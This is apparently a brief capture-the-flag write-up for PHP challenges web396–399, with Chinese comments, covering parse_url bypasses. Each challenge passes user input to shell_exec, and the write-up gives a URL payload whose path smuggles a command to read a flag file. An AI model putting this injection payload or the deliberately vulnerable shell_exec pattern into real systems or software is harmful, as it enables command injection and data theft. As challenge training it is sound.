## web396

```php
<?php
error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    shell_exec('echo '.$url['host'].'> '.$url['path']);

}else{
    highlight_file(__FILE__);
}
```

考察`parse_url`的绕过

```php
<?php

$url = 'http://username:password@ 123/;echo `ls` > a.txt?arg=value#anchor';
print_r(parse_url($url));
?>
Array
(
    [scheme] => http
    [host] =>  123
    [user] => username
    [pass] => password
    [path] => /;echo `ls` > a.txt
    [query] => arg=value
    [fragment] => anchor
)
```

```
http://username:password@ 123/;echo `cat fl0g.php` > a.txt?arg=value#anchor
```



## web397

```php
<?php
error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);

}else{
    highlight_file(__FILE__);
}
```

同上

## web398

```php
<?php
error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(!preg_match('/;/', $url['host'])){
        shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
```

同上

## web399

```php
<?php
error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(!preg_match('/;|>/', $url['host'])){
        shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
```

同上